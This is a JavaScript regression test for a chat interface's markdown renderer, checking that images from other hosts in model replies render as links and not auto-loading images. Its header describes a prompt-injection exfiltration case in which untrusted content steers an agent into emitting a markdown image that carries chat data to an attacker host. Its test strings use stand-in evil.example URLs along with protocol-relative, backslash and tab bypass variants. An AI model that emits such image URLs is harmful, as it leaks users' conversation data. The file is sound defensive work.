/**
 * Model output never makes the browser load an image from another host
 * (audit 2026-09-30, AUD-018).
 *
 * A reply is steerable by any untrusted text the agent read -- a web page,
 * an email, a document -- and `![](https://attacker/c?d=<chat data>)` used to
 * render as <img>, so the browser sent the data the moment the reply painted.
 * Only this server's own images load now; another host's image is a link the
 * reader chooses to open, and "//host" and "/\host" (which browsers resolve to
 * another host) are not "this server".
 *
 * Run: node tests/js/test_markdown_images.js
 */
"use strict";

const fs = require("fs");
const path = require("path");

global.window = global;

const src = fs.readFileSync(
  path.join(__dirname, "..", "..", "kazma-ui", "kazma_ui", "static", "js", "streaming.js"),
  "utf8",
);
const start = src.indexOf("var mdRender = (function()");
const end = src.indexOf("function copyCode", start);
if (start < 0 || end < 0) {
  console.error("Could not locate mdRender in streaming.js");
  process.exit(1);
}
const expr = src.slice(start, end).trim().replace(/^var mdRender = /, "").replace(/;?\s*$/, "");
// eslint-disable-next-line no-eval
const mdRender = eval("(" + expr + ")");

let fail = 0;
function assert(name, cond, detail) {
  if (!cond) {
    console.error("FAIL", name, (detail || "").slice(0, 300));
    fail += 1;
  } else {
    console.log("OK", name);
  }
}

const BS = "\\";
const offSite = [
  ["https image", "![chart](https://evil.example/c?d=secret)"],
  ["protocol-relative image", "![x](//evil.example/a.png)"],
  ["backslash image", "![x](/" + BS + "evil.example/a.png)"],
  ["tab image", "![x](/\t/evil.example/a.png)"],
];
for (const [name, md] of offSite) {
  const html = mdRender(md);
  assert(name + ": no <img>", html.indexOf("<img") < 0, html);
  assert(name + ": no src to another host", !/src="(https?:)?\/\/|src="\/\\/i.test(html), html);
}

const link = mdRender("![chart](https://evil.example/c?d=secret)");
assert(
  "an https image becomes a link the reader opens",
  link.indexOf('<a href="https://evil.example/c?d=secret"') >= 0 &&
    link.indexOf('target="_blank"') >= 0 &&
    link.indexOf('rel="noopener noreferrer"') >= 0 &&
    link.indexOf(">chart</a>") >= 0,
  link,
);

const own = mdRender("![logo](/static/img/kazma-icon.png)");
assert("this server's image still loads", own.indexOf('<img src="/static/img/kazma-icon.png"') >= 0, own);

// An off-site image with no alt text is one anchor, not a nested pair (the
// auto-URL linkifier must not re-wrap the visible URL).
const noAlt = mdRender("![](https://www.evil.example/c?d=secret)");
assert("no-alt off-site image is a single anchor", (noAlt.match(/<a /g) || []).length === 1, noAlt);
assert("no-alt off-site image is not nested", !/<a [^>]*>[^<]*<a /.test(noAlt), noAlt);
assert("no-alt off-site image keeps the full URL in href and title",
  noAlt.indexOf('href="https://www.evil.example/c?d=secret"') >= 0 &&
    noAlt.indexOf('title="https://www.evil.example/c?d=secret"') >= 0, noAlt);
assert("no-alt off-site image shows the URL without scheme/www",
  noAlt.indexOf('>evil.example/c?d=secret</a>') >= 0, noAlt);

const relLink = mdRender("[go](//evil.example/x)");
assert("a '//host' link is not a same-site link", relLink.indexOf('href="//evil.example') < 0, relLink);
const siteLink = mdRender("[chat](/chat)");
assert("a same-site link still works", siteLink.indexOf('<a href="/chat">chat</a>') >= 0, siteLink);

// Negative control: the image rule this replaced.
function oldImageRule(md) {
  const esc = (s) => String(s).replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" })[c]);
  return esc(md).replace(/!\[([^\]]*)\]\(([^)]+)\)/g, function (_, alt, url) {
    const decodedUrl = url.replace(/&amp;/g, "&");
    if (/^(https?:\/\/|\/)/i.test(decodedUrl)) {
      return '<img src="' + esc(decodedUrl) + '" alt="' + esc(alt) + '" loading="lazy" class="md-img">';
    }
    return esc(alt || "");
  });
}
assert(
  "negative control: the old rule loaded the attacker's image",
  oldImageRule("![chart](https://evil.example/c?d=secret)").indexOf('<img src="https://evil.example/c?d=secret"') >= 0,
);
assert(
  "negative control: the old rule loaded a '//host' image",
  oldImageRule("![x](//evil.example/a.png)").indexOf('<img src="//evil.example/a.png"') >= 0,
);

if (fail) {
  console.error(fail + " failure(s)");
  process.exit(1);
}
console.log("all passed");
